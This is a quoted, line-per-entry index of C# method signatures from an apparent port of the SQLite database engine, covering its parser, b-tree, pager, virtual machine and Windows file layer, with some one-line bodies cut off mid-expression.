"    static Expr sqlite3PExpr( Parse pParse, int op, Expr pLeft, int null_4, int null_5 )"
"    static Expr sqlite3PExpr( Parse pParse, int op, int null_3, int null_4, Token pToken )"
"    static Expr sqlite3PExpr( Parse pParse, int op, int null_3, int null_4, int null_5 )"
"    static Expr sqlite3RegisterExpr( Parse pParse, Token pToken )"
"    static ExprList sqlite3ExprListAppend( Parse pParse, int null_2, Expr pExpr )"
"    static ExprList sqlite3ExprListDup( sqlite3 db, ExprList p, int flags )"
"    static FuncDef AGGREGATE( string zName, i16 nArg, int arg, u8 nc, dxStep xStep, dxFinal xFinal )"
"    static FuncDef FUNCTION( string zName, i16 nArg, int iArg, u8 bNC, dxFunc xFunc )"
"    static FuncDef LIKEFUNC( string zName, i16 nArg, object arg, u8 flags )"
"    static HANDLE sqlite3OsDlOpen( sqlite3_vfs pVfs, string zPath )"
"    static HANDLE winDlOpen( sqlite3_vfs vfs, string zFilename ) { return new HANDLE()"
"    static HANDLE winDlSym( sqlite3_vfs vfs, HANDLE data, string zSymbol ) { return new HANDLE()"
"    static IdList sqlite3IdListAppend( sqlite3 db, IdList pList, Token pToken )"
"    static IdList sqlite3IdListAppend( sqlite3 db, int null_2, Token pToken )"
"    static IdList sqlite3IdListDup( sqlite3 db, IdList p )"
"    static Index sqlite3FindIndex( sqlite3 db, string zName, string zDb )"
"    static KeyInfo keyInfoFromExprList( Parse pParse, ExprList pList )"
"    static KeyInfo sqlite3IndexKeyinfo( Parse pParse, Index pIdx )"
"    static Mem columnMem( sqlite3_stmt pStmt, int i )"
"    static Mem0Global mem0 = new Mem0Global( 0, null, 0, null, null, 0, null, null )"
"    static MemPage btreePageFromDbPage(DbPage pDbPage, Pgno pgno, BtShared pBt)"
"    static MemPage btreePageLookup(BtShared pBt, Pgno pgno)"
"    static PgHdr pager_lookup( Pager pPager, u32 pgno )"
"    static PgHdr pcache1Fetch( sqlite3_pcache p, u32 iKey, int createFlag )"
"    static PgHdr pcacheMergeDirtyList( PgHdr pA, PgHdr pB )"
"    static PgHdr1 PAGE_TO_PGHDR1( PCache1 c, PgHdr p ) { return p.pPgHdr1"
"    static Pgno PTRMAP_PAGENO( BtShared pBt, Pgno pgno ) { return ptrmapPageno( pBt, pgno )"
"    static Pgno ptrmapPageno(BtShared pBt, Pgno pgno)"
"    static RowSet sqlite3RowSetInit( sqlite3 db, object pSpace, u32 N )"
"    static Schema sqlite3BtreeSchema(Btree p, int nBytes, dxFreeSchema xFree)"
"    static Schema sqlite3SchemaGet( sqlite3 db, Btree pBt )"
"    static Select sqlite3SelectDup( sqlite3 db, Select p, int flags )"
"    static Select sqlite3SelectNew( Parse pParse, int null_2, SrcList pSrc, int null_4, int null_5, int null_6, int null_7, int isDistinct, int null_9, int null_10 )"
"    static SrcList sqlite3SrcListAppend( sqlite3 db, int null_2, Token pTable, Token pDatabase )"
"    static SrcList sqlite3SrcListAppend( sqlite3 db, int null_2, Token pTable, int null_4 )"
"    static SrcList sqlite3SrcListAppendFromTerm( Parse pParse, SrcList p, Token pTable, Token pDatabase, Token pAlias, int null_6, Expr pOn, IdList pUsing )"
"    static SrcList sqlite3SrcListAppendFromTerm( Parse pParse, SrcList p, int null_3, int null_4, Token pAlias, Select pSubquery, Expr pOn, IdList pUsing )"
"    static SrcList sqlite3SrcListDup( sqlite3 db, SrcList p, int flags )"
"    static Table isSimpleCount( Select p, AggInfo pAggInfo )"
"    static Table sqlite3FindTable( sqlite3 db, string zName, string zDatabase )"
"    static Table sqlite3ResultSetOfSelect( Parse pParse, Select pSelect )"
"    static Table sqlite3SrcListLookup( Parse pParse, SrcList pSrc )"
"    static Trigger sqlite3TriggerList( Parse pParse, Table pTab )"
"    static TriggerStep sqlite3TriggerInsertStep( sqlite3 db, Token pTableName, IdList pColumn, ExprList pEList, int null_5, u8 orconf )"
"    static TriggerStep sqlite3TriggerInsertStep( sqlite3 db, Token pTableName, IdList pColumn, int null_4, Select pSelect, u8 orconf )"
"    static TriggerStep sqlite3TriggerInsertStep( sqlite3 db, Token pTableName, IdList pColumn, int null_4, int null_5, u8 orconf )"
"    static TriggerStep sqlite3TriggerSelectStep( sqlite3 db, Select pSelect )"
"    static VTable sqlite3GetVTable(sqlite3 db , Table T) {return null"
"    static VdbeOp sqlite3VdbeGetOp( Vdbe p, int addr )"
"    static bool DbHasProperty( sqlite3 D, int I, ushort P ) { return ( D.aDb[I].pSchema.flags "
"    static bool ExprHasAnyProperty( Expr E, int P ) { return ( E.flags "
"    static bool ExprHasProperty( Expr E, int P ) { return ( E.flags "
"    static bool PTRMAP_ISPAGE( BtShared pBt, u32 pgno ) { return ( PTRMAP_PAGENO( ( pBt ), ( pgno ) ) == ( pgno ) )"
"    static bool allSpaces( string z, int iStart, int n )"
"    static bool btreeGetHasContent(BtShared pBt, Pgno pgno)"
"    static bool collationMatch( string zColl, Index pIndex )"
"    static bool hasReadConflicts(Btree a, Pgno b) { return false"
"    static bool hasSharedCacheTableLock(Btree a, Pgno b, int c, int d) { return true"
"    static bool isLookaside( sqlite3 db, object p )"
"    static bool readsTable(Parse p, int iStartAddr, int iDb, Table pTab )"
"    static bool rehash( ref Hash pH, u32 new_size )"
"    static bool sqlite3Atoi64( string zNum, ref i64 pNum )"
"    static bool sqlite3ExprCompare( Expr pA, Expr pB )"
"    static bool sqlite3FitsIn64Bits( string zNum, bool negFlag )"
"    static bool sqlite3GetInt32( string zNum, ref int pValue )"
"    static bool sqlite3IndexAffinityOk( Expr pExpr, char idx_affinity )"
"    static bool sqlite3IsLikeFunction( sqlite3 db, Expr pExpr, ref bool pIsNocase, char[] aWc )"
"    static bool sqlite3IsReadOnly( Parse pParse, Table pTab, int viewOk )"
"    static bool sqlite3PagerLockingMode( Pager pPager, int eMode )"
"    static bool sqlite3VdbeOpcodeHasProperty( int opcode, int mask )"
"    static bool xferCompatibleCollation( string z1, string z2 )"
"    static bool xferCompatibleIndex( Index pDest, Index pSrc )"
"    static byte[] sqlite3BtreeDataFetch( BtCursor pCur, ref int pAmt, ref int outOffset )"
"    static byte[] sqlite3BtreeKeyFetch( BtCursor pCur, ref int pAmt, ref int outOffset )"
"    static byte[] sqlite3DbMallocRaw( sqlite3 db, int n )"
"    static byte[] sqlite3DbMallocZero( sqlite3 db, int n )"
"    static byte[] sqlite3HexToBlob( sqlite3 db, string z, int n )"
"    static byte[] sqlite3MemRealloc( ref byte[] pPrior, int nByte )"
"    static byte[] sqlite3Realloc( byte[] pOld, int nBytes )"
"    static byte[] sqlite3_realloc( object pOld, int n )"
"    static char et_getdigit( ref LONGDOUBLE_TYPE val, ref int cnt )"
"    static char sqlite3CompareAffinity( Expr pExpr, char aff2 )"
"    static compareInfo likeInfoAlt = new compareInfo( '%', '_', '"
"    static compareInfo likeInfoNorm = new compareInfo( '%', '_', '"
"    static i64 sqlite3PagerJournalSizeLimit( Pager pPager, i64 iLimit )"
"    static int MIN( int x, int y ) { return ( x < y ) "
"    static int MIN( int x, u32 y ) { return ( x < y ) "
"    static int TESTBIT( byte[] V, int I ) { return ( V[I >> 3] "
"    static int addAggInfoColumn( sqlite3 db, AggInfo pInfo )"
"    static int addAggInfoFunc( sqlite3 db, AggInfo pInfo )"
"    static int addToSavepointBitvecs( Pager pPager, u32 pgno )"
"    static int allocateSpace(MemPage pPage, int nByte, ref int pIdx)"
"    static int analysisLoader( object pData, sqlite3_int64 argc, object Oargv, object NotUsed )"
"    static int analyzeAggregate( Walker pWalker, ref Expr pExpr )"
"    static int analyzeAggregatesInSelect( Walker pWalker, Select pSelect )"
"    static int backupOnePage( sqlite3_backup p, Pgno iSrcPg, byte[] zSrcData )"
"    static int backupTruncateFile( sqlite3_file pFile, int iSize )"
"    static int balance_deeper(MemPage pRoot, ref MemPage ppChild)"
"    static int balance_quick(MemPage pParent, MemPage pPage, u8[] pSpace)"
"    static int btreeCreateTable(Btree p, ref int piTable, int flags)"
"    static int btreeDropTable(Btree p, Pgno iTable, ref int piMoved)"
"    static int btreeSetHasContent(BtShared pBt, Pgno pgno)"
"    static int changeTempStorage( Parse pParse, string zStorageType )"
"    static int checkColumnOverlap( IdList pIdList, ExprList pEList )"
"    static int checkRef(IntegrityCk pCheck, Pgno iPage, string zContext)"
"    static int clearCell(MemPage pPage, int pCell)"
"    static int codeAlias( Parse pParse, int iAlias, Expr pExpr, int target )"
"    static int columnIndex( Table pTab, string zCol )"
"    static int decodeFlags(MemPage pPage, int flagByte)"
"    static int dupedExprNodeSize( Expr p, int flags )"
"    static int dupedExprSize( Expr p, int flags )"
"    static int dupedExprStructSize( Expr p, int flags )"
"    static int evalConstExpr( Walker pWalker, ref Expr pExpr )"
"    static int execExecSql( sqlite3 db, string zSql )"
"    static int execSql( sqlite3 db, string zSql )"
"    static int exprIsConst( Expr p, int initFlag )"
"    static int exprNodeIsConstant( Walker pWalker, ref Expr pExpr )"
"    static int exprWalkNoop( Walker NotUsed, ref Expr NotUsed2 )"
"    static int fileExists( sqlite3 db, string zFile )"
"    static int findCell(MemPage pPage, int iCell)"
"    static int findOverflowCell(MemPage pPage, int iCell)"
"    static int flagPragma( Parse pParse, string zLeft, string zRight )"
"    static int freePage2(BtShared pBt, MemPage pMemPage, Pgno iPage)"
"    static int freeSpace(MemPage pPage, int start, int size)"
"    static int get2byte( byte[] p, int offset )"
"    static int getDigits( string zDate, int N, int min, int max, char nextC, ref int pVal )"
"    static int getDigits( string zDate, int N0, int min0, int max0, char nextC0, ref int pVal0, int N1, int min1, int max1, char nextC1, ref int pVal1 )"
"    static int getDigits( string zDate, int N0, int min0, int max0, char nextC0, ref int pVal0, int N1, int min1, int max1, char nextC1, ref int pVal1, int N2, int min2, int max2, char nextC2, ref int pVal2 )"
"    static int getLastErrorMsg( int nBuf, ref string zBuf )"
"    static int getTempname( int nBuf, StringBuilder zBuf )"
"    static int getVarint( byte[] p, int offset, ref i64 v )"
"    static int getVarint( byte[] p, int offset, ref int v )"
"    static int getVarint( byte[] p, int offset, ref u32 v )"
"    static int getVarint( byte[] p, int offset, ref u64 v )"
"    static int getVarint( byte[] p, ref u32 v )"
"    static int getVarint32( byte[] p, int offset, ref int v )"
"    static int getVarint32( byte[] p, int offset, ref u32 v )"
"    static int getVarint32( byte[] p, ref u32 v )"
"    static int getVarint32( byte[] p, u32 offset, ref u32 v )"
"    static int getVarint32( string s, u32 offset, ref int v )"
"    static int getVarint32( string s, u32 offset, ref u32 v )"
"    static int hasHotJournal( Pager pPager, ref int pExists )"
"    static int incrVacuumStep(BtShared pBt, Pgno nFin, Pgno iLastPg)"
"    static int keywordCode( string z, int iOffset, int n )"
"    static int mallocWithAlarm( int n, ref byte[] pp )"
"    static int matchQuality( FuncDef p, int nArg, int enc )"
"    static int memcmp( byte[] a, int Offset, byte[] b, int Limit )"
"    static int memcmp( byte[] a, int Offset, string b, int Limit )"
"    static int memcmp( byte[] bA, byte[] bB, int Limit )"
"    static int memcmp( byte[] bA, string B, int Limit )"
"    static int memcmp( string A, byte[] bB, int Limit )"
"    static int memcmp( string A, string B, int Limit )"
"    static int memcmp( string a, int Offset, byte[] b, int Limit )"
"    static int memjrnlFileSize( sqlite3_file pJfd, ref int pSize )"
"    static int memjrnlSync( sqlite3_file NotUsed, int NotUsed2 )"
"    static int memjrnlTruncate( sqlite3_file pJfd, sqlite3_int64 size )"
"    static int modifyPagePointer(MemPage pPage, Pgno iFrom, Pgno iTo, u8 eType)"
"    static int moveToChild(BtCursor pCur, u32 newPgno)"
"    static int osUnlock( sqlite3_file pFd, int eLock )"
"    static int pagerPlaybackSavepoint( Pager pPager, PagerSavepoint pSavepoint )"
"    static int pagerStress( object p, PgHdr pPg )"
"    static int pager_datahash( int X, byte[] Y ) { return 0"
"    static int pager_delmaster( Pager pPager, string zMaster )"
"    static int pager_end_transaction( Pager pPager, int hasMaster )"
"    static int pager_error( Pager pPager, int rc )"
"    static int pager_incr_changecounter( Pager pPager, bool isDirectMode )"
"    static int pager_playback( Pager pPager, int isHot )"
"    static int pager_truncate( Pager pPager, u32 nPage )"
"    static int pager_wait_on_lock( Pager pPager, int locktype )"
"    static int parseHhMmSs( string zDate, DateTime p )"
"    static int parseModifier( string zMod, DateTime p )"
"    static int parseTimezone( string zDate, DateTime p )"
"    static int parseYyyyMmDd( string zDate, DateTime p )"
"    static int ptrmapGet(BtShared pBt, Pgno key, ref u8 pEType, ref Pgno pPgno)"
"    static int putVarint( byte[] p, int offset, int v )"
"    static int putVarint( byte[] p, int offset, u64 v )"
"    static int putVarint32( byte[] p, int offset, int v )"
"    static int putVarint32( byte[] p, int v )"
"    static int querySharedCacheTableLock(Btree p, Pgno iTab, u8 eLock) { return SQLITE_OK"
"    static int read32bits( sqlite3_file fd, i64 offset, ref u32 pRes )"
"    static int read32bits( sqlite3_file fd, int offset, ref int pRes )"
"    static int read32bits( sqlite3_file fd, int offset, ref u32 pRes )"
"    static int readMasterJournal( sqlite3_file pJrnl, byte[] zMaster, u32 nMaster )"
"    static int resolveAttachExpr( NameContext pName, Expr pExpr )"
"    static int resolveExprStep( Walker pWalker, ref Expr pExpr )"
"    static int resolveSelectStep( Walker pWalker, Select p )"
"    static int saveAllCursors(BtShared pBt, Pgno iRoot, BtCursor pExcept)"
"    static int selectAddSubqueryTypeInfo( Walker pWalker, Select p )"
"    static int selectExpander( Walker pWalker, Select p )"
"    static int selectNodeIsConstant( Walker pWalker, Select NotUsed )"
"    static int setupLookaside( sqlite3 db, byte[] pBuf, int sz, int cnt )"
"    static int sqlite3AnalysisLoad( sqlite3 db, int iDb )"
"    static int sqlite3ApiExit( int zero, int rc )"
"    static int sqlite3ApiExit( sqlite3 db, int rc )"
"    static int sqlite3AtoF( string z, ref double pResult )"
"    static int sqlite3AuthCheck( Parse a, int b, string c, byte[] d, byte[] e ) { return SQLITE_OK"
"    static int sqlite3BitvecBuiltinTest( u32 sz, int[] aOp )"
"    static int sqlite3BitvecSet( Bitvec p, u32 i )"
"    static int sqlite3BitvecTest( Bitvec p, u32 i )"
"    static int sqlite3BtreeBeginStmt(Btree p, int iStatement)"
"    static int sqlite3BtreeBeginTrans(Btree p, int wrflag)"
"    static int sqlite3BtreeClearTable(Btree p, int iTable, ref int pnChange)"
"    static int sqlite3BtreeCommitPhaseOne(Btree p, string zMaster)"
"    static int sqlite3BtreeCopyFile( Btree pTo, Btree pFrom )"
"    static int sqlite3BtreeCount(BtCursor pCur, ref i64 pnEntry)"
"    static int sqlite3BtreeCreateTable(Btree p, ref int piTable, int flags)"
"    static int sqlite3BtreeCursorHasMoved(BtCursor pCur, ref int pHasMoved)"
"    static int sqlite3BtreeData(BtCursor pCur, u32 offset, u32 amt, byte[] pBuf)"
"    static int sqlite3BtreeDataSize(BtCursor pCur, ref u32 pSize)"
"    static int sqlite3BtreeDropTable(Btree p, int iTable, ref int piMoved)"
"    static int sqlite3BtreeFirst(BtCursor pCur, ref int pRes)"
"    static int sqlite3BtreeKey(BtCursor pCur, u32 offset, u32 amt, byte[] pBuf)"
"    static int sqlite3BtreeKeySize(BtCursor pCur, ref i64 pSize)"
"    static int sqlite3BtreeLast(BtCursor pCur, ref int pRes)"
"    static int sqlite3BtreeMaxPageCount(Btree p, int mxPage)"
"    static int sqlite3BtreeNext(BtCursor pCur, ref int pRes)"
"    static int sqlite3BtreePrevious(BtCursor pCur, ref int pRes)"
"    static int sqlite3BtreeSavepoint(Btree p, int op, int iSavepoint)"
"    static int sqlite3BtreeSetAutoVacuum(Btree p, int autoVacuum)"
"    static int sqlite3BtreeSetCacheSize(Btree p, int mxPage)"
"    static int sqlite3BtreeSetPageSize(Btree p, int pageSize, int nReserve, int iFix)"
"    static int sqlite3BtreeSetSafetyLevel(Btree p, int level, int fullSync)"
"    static int sqlite3BtreeUpdateMeta(Btree p, int idx, u32 iMeta)"
"    static int sqlite3CheckCollSeq( Parse pParse, CollSeq pColl )"
"    static int sqlite3CheckObjectName( Parse pParse, string zName )"
"    static int sqlite3ExprCheckHeight( Parse pParse, int nHeight )"
"    static int sqlite3ExprCode( Parse pParse, Expr pExpr, int target )"
"    static int sqlite3ExprCodeAndCache( Parse pParse, Expr pExpr, int target )"
"    static int sqlite3ExprCodeTarget( Parse pParse, Expr pExpr, int target )"
"    static int sqlite3ExprCodeTemp( Parse pParse, Expr pExpr, ref int pReg )"
"    static int sqlite3ExprIsInteger( Expr p, ref int pValue )"
"    static int sqlite3FindDb( sqlite3 db, Token pName )"
"    static int sqlite3FindDbName( sqlite3 db, string zName )"
"    static int sqlite3FindInIndex( Parse pParse, Expr pX, ref int prNotFound )"
"    static int sqlite3GetTempRange( Parse pParse, int nReg )"
"    static int sqlite3GetToken( string z, int iOffset, ref int tokenType )"
"    static int sqlite3IdListIndex( IdList pList, string zName )"
"    static int sqlite3IndexedByLookup( Parse pParse, SrcList_item pFrom )"
"    static int sqlite3Init( sqlite3 db, ref string pzErrMsg )"
"    static int sqlite3InitCallback( object pInit, sqlite3_int64 argc, object p2, object NotUsed )"
"    static int sqlite3InitOne( sqlite3 db, int iDb, ref string pzErrMsg )"
"    static int sqlite3IsNumber( string z, ref int realnum, int enc )"
"    static int sqlite3JoinType( Parse pParse, Token pA, Token pB, Token pC )"
"    static int sqlite3JoinType( Parse pParse, Token pA, Token pB, int null_4 )"
"    static int sqlite3JoinType( Parse pParse, Token pA, int null_3, int null_4 )"
"    static int sqlite3KeywordCode( string z, int n )"
"    static int sqlite3MemCompare( Mem pMem1, Mem pMem2, CollSeq pColl )"
"    static int sqlite3OsAccess( sqlite3_vfs pVfs, string zPath, int flags, ref int pResOut )"
"    static int sqlite3OsCheckReservedLock( sqlite3_file id, ref int pResOut )"
"    static int sqlite3OsCurrentTime( sqlite3_vfs pVfs, ref double pTimeOut )"
"    static int sqlite3OsDelete( sqlite3_vfs pVfs, string zPath, int dirSync )"
"    static int sqlite3OsFileControl( sqlite3_file id, u32 op, ref int pArg )"
"    static int sqlite3OsFileSize( sqlite3_file id, ref int pSize )"
"    static int sqlite3OsLock( sqlite3_file id, int lockType )"
"    static int sqlite3OsRandomness( sqlite3_vfs pVfs, int nByte, ref byte[] zBufOut )"
"    static int sqlite3OsRead( sqlite3_file id, byte[] pBuf, int amt, i64 offset )"
"    static int sqlite3OsSleep( sqlite3_vfs pVfs, int nMicro )"
"    static int sqlite3OsSync( sqlite3_file id, int flags )"
"    static int sqlite3OsTruncate( sqlite3_file id, i64 size )"
"    static int sqlite3OsUnlock( sqlite3_file id, int lockType )"
"    static int sqlite3OsWrite( sqlite3_file id, byte[] pBuf, int amt, i64 offset )"
"    static int sqlite3PagerBegin( Pager pPager, bool exFlag, int subjInMemory )"
"    static int sqlite3PagerJournalMode( Pager pPager, int eMode )"
"    static int sqlite3PagerMovepage( Pager pPager, DbPage pPg, u32 pgno, int isCommit )"
"    static int sqlite3PagerOpenSavepoint( Pager pPager, int nSavepoint )"
"    static int sqlite3PagerPagecount( Pager pPager, ref int pnPage )"
"    static int sqlite3PagerReadFileheader( Pager pPager, int N, byte[] pDest )"
"    static int sqlite3PagerSavepoint( Pager pPager, int op, int iSavepoint )"
"    static int sqlite3PagerSetPagesize( Pager pPager, ref u16 pPageSize, int nReserve )"
"    static int sqlite3PutVarint( byte[] p, int offset, int v )"
"    static int sqlite3PutVarint( byte[] p, int offset, u64 v )"
"    static int sqlite3RowSetNext( RowSet p, ref i64 pRowid )"
"    static int sqlite3RowSetTest( RowSet pRowSet, u8 iBatch, sqlite3_int64 iRowid )"
"    static int sqlite3RunParser( Parse pParse, string zSql, ref string pzErrMsg )"
"    static int sqlite3RunVacuum( ref string pzErrMsg, sqlite3 db )"
"    static int sqlite3SchemaToIndex( sqlite3 db, Schema pSchema )"
"    static int sqlite3StrICmp( string zLeft, string zRight )"
"    static int sqlite3StrNICmp( string zLeft, int offsetLeft, string zRight, int N )"
"    static int sqlite3StrNICmp( string zLeft, string zRight, int N )"
"    static int sqlite3TransferBindings( sqlite3_stmt pFromStmt, sqlite3_stmt pToStmt )"
"    static int sqlite3Utf8CharLen( string zIn, int nByte )"
"    static int sqlite3ValueBytes( sqlite3_value pVal, int enc )"
"    static int sqlite3VdbeAddOp0( Vdbe p, int op )"
"    static int sqlite3VdbeAddOp1( Vdbe p, int op, int p1 )"
"    static int sqlite3VdbeAddOp2( Vdbe p, int op, int p1, bool b2 )"
"    static int sqlite3VdbeAddOp2( Vdbe p, int op, int p1, int p2 )"
"    static int sqlite3VdbeAddOp3( Vdbe p, int op, int p1, int p2, int p3 )"
"    static int sqlite3VdbeAddOp4( Vdbe p, int op, int p1, int p2, int p3, CollSeq pP4, int p4type )"
"    static int sqlite3VdbeAddOp4( Vdbe p, int op, int p1, int p2, int p3, FuncDef pP4, int p4type )"
"    static int sqlite3VdbeAddOp4( Vdbe p, int op, int p1, int p2, int p3, KeyInfo pP4, int p4type )"
"    static int sqlite3VdbeAddOp4( Vdbe p, int op, int p1, int p2, int p3, byte[] pP4, int p4type )"
"    static int sqlite3VdbeAddOp4( Vdbe p, int op, int p1, int p2, int p3, char pP4, int p4type )"
"    static int sqlite3VdbeAddOp4( Vdbe p, int op, int p1, int p2, int p3, double pP4, int p4type )"
"    static int sqlite3VdbeAddOp4( Vdbe p, int op, int p1, int p2, int p3, i32 pP4, int p4type )"
"    static int sqlite3VdbeAddOp4( Vdbe p, int op, int p1, int p2, int p3, i64 pP4, int p4type )"
"    static int sqlite3VdbeAddOp4( Vdbe p, int op, int p1, int p2, int p3, int[] pP4, int p4type )"
"    static int sqlite3VdbeAddOp4( Vdbe p, int op, int p1, int p2, int p3, string pP4, int p4type )"
"    static int sqlite3VdbeAddOpList( Vdbe p, int nOp, VdbeOpList[] aOp )"
"    static int sqlite3VdbeChangeEncoding( Mem pMem, int desiredEnc )"
"    static int sqlite3VdbeCloseStatement( Vdbe p, int eOp )"
"    static int sqlite3VdbeIdxRowid( sqlite3 db, BtCursor pCur, ref i64 rowid )"
"    static int sqlite3VdbeMemCopy( Mem pTo, Mem pFrom )"
"    static int sqlite3VdbeMemFinalize( Mem pMem, FuncDef pFunc )"
"    static int sqlite3VdbeMemGrow( Mem pMem, int n, int preserve )"
"    static int sqlite3VdbeMemStringify( Mem pMem, int enc )"
"    static int sqlite3ViewGetColumnNames( Parse pParse, Table pTable )"
"    static int sqlite3VtabSync( sqlite3 X, string Y ) { return SQLITE_OK"
"    static int sqlite3WalkExpr( Walker pWalker, ref Expr pExpr )"
"    static int sqlite3WalkExprList( Walker pWalker, ExprList p )"
"    static int sqlite3WalkSelect( Walker pWalker, Select p )"
"    static int sqlite3WalkSelectExpr( Walker pWalker, Select p )"
"    static int sqlite3WalkSelectFrom( Walker pWalker, Select p )"
"    static int sqlite3_bind_value( sqlite3_stmt pStmt, int i, sqlite3_value pValue )"
"    static int sqlite3_bind_zeroblob( sqlite3_stmt pStmt, int i, int n )"
"    static int sqlite3_column_bytes( sqlite3_stmt pStmt, int i )"
"    static int sqlite3_column_bytes16( sqlite3_stmt pStmt, int i )"
"    static int sqlite3_config( int op, params object[] ap )"
"    static int sqlite3_config( int op, ref sqlite3_mem_methods ap )"
"    static int sqlite3_config( int op, ref sqlite3_pcache_methods ap )"
"    static int sqlite3_config( int op, sqlite3_mem_methods ap )"
"    static int sqlite3_config( int op, sqlite3_pcache_methods ap )"
"    static int sqlite3_db_config( sqlite3 db, int op, params object[] ap )"
"    static int sqlite3_extended_result_codes( sqlite3 db, bool onoff )"
"    static int sqlite3_fileSize( sqlite3_file id, ref int pSize )"
"    static int sqlite3_file_control( sqlite3 db, string zDbName, int op, ref int pArg )"
"    static int sqlite3_limit( sqlite3 db, int limitId, int newLimit )"
"    static int sqlite3_status( int op, ref int pCurrent, ref int pHighwater, int resetFlag )"
"    static int sqlite3_stmt_status( sqlite3_stmt pStmt, int op, int resetFlag )"
"    static int sqlite3_strnicmp( string zLeft, int offsetLeft, string zRight, int N )"
"    static int sqlite3_test_control( int op, params object[] ap )"
"    static int sqlite3_transfer_bindings( sqlite3_stmt pFromStmt, sqlite3_stmt pToStmt )"
"    static int sqlite3_vfs_register( sqlite3_vfs pVfs, int makeDflt )"
"    static int sqliteProcessJoin( Parse pParse, Select p )"
"    static int synthCollSeq( sqlite3 db, CollSeq pColl )"
"    static int usedAsColumnCache( Parse pParse, int iFrom, int iTo )"
"    static int vdbeCommit( sqlite3 db, Vdbe p )"
"    static int vdbeUnbind( Vdbe p, int i )"
"    static int whereClauseInsert( WhereClause pWC, Expr p, u8 wtFlags )"
"    static int winCheckReservedLock( sqlite3_file id, ref int pResOut )"
"    static int winCurrentTime( sqlite3_vfs pVfs, ref double prNow )"
"    static int winDlClose( sqlite3_vfs vfs, HANDLE data ) { return 0"
"    static int winDlError( sqlite3_vfs vfs, int nByte, ref string zErrMsg ) { return 0"
"    static int winFileControl( sqlite3_file id, int op, ref int pArg )"
"    static int winGetLastError( sqlite3_vfs pVfs, int nBuf, ref string zBuf )"
"    static int winLock( sqlite3_file id, int locktype )"
"    static int winRandomness( sqlite3_vfs pVfs, int nBuf, ref byte[] zBuf )"
"    static int winSleep( sqlite3_vfs pVfs, int microsec )"
"    static int winSync( sqlite3_file id, int flags )"
"    static int winTruncate( sqlite3_file id, sqlite3_int64 nByte )"
"    static int winUnlock( sqlite3_file id, int locktype )"
"    static int write32bits( sqlite3_file fd, i64 offset, u32 val )"
"    static int writeMasterJournal( Pager pPager, string zMaster )"
"    static int zeroJournalHdr( Pager pPager, int doTruncate )"
"    static long sqlite3PagerMaxPageCount( Pager pPager, int mxPage )"
"    static object sqlite3DbRealloc( sqlite3 db, object p, int n )"
"    static object sqlite3HashFind( Hash pH, string pKey, int nKey )"
"    static object sqlite3HashInsert( ref Hash pH, string pKey, int nKey, object data )"
"    static object sqlite3OsDlSym( sqlite3_vfs pVfs, HANDLE pHdle, ref string zSym )"
"    static object sqlite3_trace( sqlite3 db, dxTrace xTrace, object pArg )"
"    static object va_arg( object[] ap, string sysType )"
"    static sqlite3AutoExtList sqlite3Autoext = new sqlite3AutoExtList( 0, null )"
"    static sqlite3_pcache pcache1Create( int szPage, int bPurgeable )"
"    static sqlite3_stmt sqlite3_next_stmt( sqlite3 pDb, sqlite3_stmt pStmt )"
"    static sqlite3_value sqlite3_column_value( sqlite3_stmt pStmt, int i )"
"    static string aDigits = ""0123456789ABCDEF0123456789abcdef"""
"    static string aPrefix = ""-x0"
"    static string createTableStmt( sqlite3 db, Table p )"
"    static string displayP4( Op pOp, string zBuffer, int nTemp )"
"    static string sqlite3MAppendf( sqlite3 db, string zStr, string zFormat, params  va_list[] ap )"
"    static string sqlite3MPrintf( sqlite3 db, string zFormat, params va_list[] ap )"
"    static string sqlite3NameFromToken( sqlite3 db, Token pName )"
"    static string sqlite3VMPrintf( sqlite3 db, string zFormat, params va_list[] ap )"
"    static string sqlite3ValueText( sqlite3_value pVal, int enc )"
"    static string sqlite3_bind_parameter_name( sqlite3_stmt pStmt, int i )"
"    static string sqlite3_errmsg16( sqlite3 db ) { return """""
"    static string sqlite3_get_auxdata( sqlite3_context pCtx, int iArg )"
"    static string sqlite3_temp_directory = """""
"    static string sqlite3_vmprintf( string zFormat, params  va_list[] ap )"
"    static string whereTempTriggers( Parse pParse, Table pTab )"
"    static string yyTracePrompt = """""
"    static u16 cellSize(MemPage pPage, int iCell)"
"    static u16 cellSizePtr(MemPage pPage, byte[] pCell, int offset)"
"    static u16 cellSizePtr(MemPage pPage, int iCell)"
"    static u16 cellSizePtr(MemPage pPage, u8[] pCell)"
"    static u32 PTRMAP_PTROFFSET( u32 pgptrmap, u32 pgno ) { return ( 5 "
"    static u32 pager_cksum( Pager pPager, byte[] aData )"
"    static u32 sqlite3Get4byte( u8[] p, int offset )"
"    static u32 sqlite3Get4byte( u8[] p, int p_offset, int offset )"
"    static u32 sqlite3Get4byte( u8[] p, u32 offset )"
"    static u32 sqlite3VdbeSerialPut( byte[] buf, int offset, int nBuf, Mem pMem, int file_format )"
"    static u32 sqlite3VdbeSerialType( Mem pMem, int file_format )"
"    static u32 strHash( string z, int nKey )"
"    static u8 binaryCompareP5( Expr pExpr1, Expr pExpr2, int jumpIfNull )"
"    static u8 sqlite3GetVarint( byte[] p, int offset, ref u64 v )"
"    static u8 sqlite3GetVarint32( byte[] p, int offset, ref int v )"
"    static u8 sqlite3GetVarint32( byte[] p, int offset, ref u32 v )"
"    static u8 sqlite3GetVarint32( byte[] p, ref int v )"
"    static u8 sqlite3GetVarint32( byte[] p, ref u32 v )"
"    static void //sqlite3DbFree( sqlite3 db, object p )"
"    static void //sqlite3DbFree( sqlite3 db, ref StringBuilder x )"
"    static void //sqlite3DbFree( sqlite3 db, ref byte[] x )"
"    static void //sqlite3DbFree( sqlite3 db, ref int[] x )"
"    static void //sqlite3DbFree( sqlite3 db, ref string x )"
"    static void //sqlite3DbFree<T>( sqlite3 db, ref T p ) where T : class"
"    static void //sqlite3StackFree( sqlite3 D, object P ) {sqlite3DbFree( D, P )"
"    static void CLEARBIT( byte[] V, int I ) { V[I >> 3] "
"    static void CODEC2( Pager P, byte[] D, uint N, int X, int E, ref byte[] O ) { O = D"
"    static void DbClearProperty( sqlite3 D, int I, ushort P ) { D.aDb[I].pSchema.flags = (u16)( D.aDb[I].pSchema.flags "
"    static void DbSetProperty( sqlite3 D, int I, ushort P ) { D.aDb[I].pSchema.flags = (u16)( D.aDb[I].pSchema.flags "
"    static void ExprClearProperty( Expr E, int P ) { E.flags = (ushort)( E.flags "
"    static void ExprSetProperty( Expr E, int P ) { E.flags = (ushort)( E.flags "
"    static void IOTRACE( string F, params object[] ap ) { }"
"    static void MemSetTypeFlag( Mem p, int f ) { p.flags = (u16)( p.flags "
